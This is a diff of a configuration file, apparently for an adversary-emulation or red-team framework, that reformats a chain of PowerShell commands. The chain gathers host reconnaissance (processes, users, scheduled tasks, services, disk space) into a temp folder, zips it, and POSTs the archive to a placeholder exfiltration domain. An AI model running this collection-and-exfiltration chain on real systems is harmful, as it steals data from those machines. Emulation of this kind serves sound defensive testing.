@@ -166,13 +166,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $tmpfile = \"C:\\users\\$username\\appdata\\local\\temp\\",
-                            "self.temp_dir_name",
-                            "\"; mkdir $tmpfile; echo \" \"}"
-                        ]
-                    }
+                    "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $tmpfile = \"C:\\users\\$username\\appdata\\local\\temp\\${self.temp_dir_name}\"; mkdir $tmpfile; echo \" \"}"
                 }
             }
         },
@@ -198,13 +192,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $tmpfile = \"C:\\users\\$username\\appdata\\local\\temp\\",
-                            "self.temp_dir_name",
-                            "\"; fsutil volume diskfree c: > \"$tmpfile\\disk.txt\"; echo \" \"}"
-                        ]
-                    }
+                    "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $tmpfile = \"C:\\users\\$username\\appdata\\local\\temp\\${self.temp_dir_name}\"; fsutil volume diskfree c: > \"$tmpfile\\disk.txt\"; echo \" \"}"
                 }
             }
         },
@@ -217,13 +205,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $tmpfile = \"C:\\users\\$username\\appdata\\local\\temp\\",
-                            "self.temp_dir_name",
-                            "\"; tasklist /v > \"$tmpfile\\task-list.txt\"; echo \" \"}"
-                        ]
-                    }
+                    "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $tmpfile = \"C:\\users\\$username\\appdata\\local\\temp\\${self.temp_dir_name}\"; tasklist /v > \"$tmpfile\\task-list.txt\"; echo \" \"}"
                 }
             }
         },
@@ -236,13 +218,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $tmpfile = \"C:\\users\\$username\\appdata\\local\\temp\\",
-                            "self.temp_dir_name",
-                            "\"; query user > \"$tmpfile\\users.txt\"; echo \" \"}"
-                        ]
-                    }
+                    "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $tmpfile = \"C:\\users\\$username\\appdata\\local\\temp\\${self.temp_dir_name}\"; query user > \"$tmpfile\\users.txt\"; echo \" \"}"
                 }
             }
         },
@@ -255,13 +231,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $tmpfile = \"C:\\users\\$username\\appdata\\local\\temp\\",
-                            "self.temp_dir_name",
-                            "\"; schtasks /query /v /fo csv > \"$tmpfile\\scheduled-tasks.txt\"; echo \" \"}"
-                        ]
-                    }
+                    "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $tmpfile = \"C:\\users\\$username\\appdata\\local\\temp\\${self.temp_dir_name}\"; schtasks /query /v /fo csv > \"$tmpfile\\scheduled-tasks.txt\"; echo \" \"}"
                 }
             }
         },
@@ -274,13 +244,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $tmpfile = \"C:\\users\\$username\\appdata\\local\\temp\\",
-                            "self.temp_dir_name",
-                            "\"; sc.exe  query type=service state=all > \"$tmpfile\\services.txt\"; echo \" \"}"
-                        ]
-                    }
+                    "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $tmpfile = \"C:\\users\\$username\\appdata\\local\\temp\\${self.temp_dir_name}\"; sc.exe  query type=service state=all > \"$tmpfile\\services.txt\"; echo \" \"}"
                 }
             }
         },
@@ -293,13 +257,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $tmpfile = \"C:\\users\\$username\\appdata\\local\\temp\\",
-                            "self.temp_dir_name",
-                            "\"; wmic service get name,startname > \"$tmpdir\\services-wmi.txt\"; echo \" \"}"
-                        ]
-                    }
+                    "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $tmpfile = \"C:\\users\\$username\\appdata\\local\\temp\\${self.temp_dir_name}\"; wmic service get name,startname > \"$tmpdir\\services-wmi.txt\"; echo \" \"}"
                 }
             }
         },
@@ -312,13 +270,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $tmpfile = \"C:\\users\\$username\\appdata\\local\\temp\\",
-                            "self.temp_dir_name",
-                            "\"; Compress-Archive -Path $tmpfile -DestinationPath \"$tmpfile.zip\"; echo \"success\" }"
-                        ]
-                    }
+                    "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $tmpfile = \"C:\\users\\$username\\appdata\\local\\temp\\${self.temp_dir_name}\"; Compress-Archive -Path $tmpfile -DestinationPath \"$tmpfile.zip\"; echo \"success\" }"
                 }
             }
         },
@@ -343,15 +295,7 @@
                 "target": "self.target_1",
                 "exfil": "self.exfil",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $zipfile = \"C:\\users\\$username\\appdata\\local\\temp\\",
-                            "self.temp_dir_name",
-                            ".zip\"; Invoke-RestMethod -Uri ",
-                            "self.exfil_domain",
-                            "/ -Method Post -InFile $zipfile;echo \" \"}"
-                        ]
-                    }
+                    "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $zipfile = \"C:\\users\\$username\\appdata\\local\\temp\\${self.temp_dir_name}.zip\"; Invoke-RestMethod -Uri ${self.exfil_domain}/ -Method Post -InFile $zipfile;echo \" \"}"
                 }
             }
         },
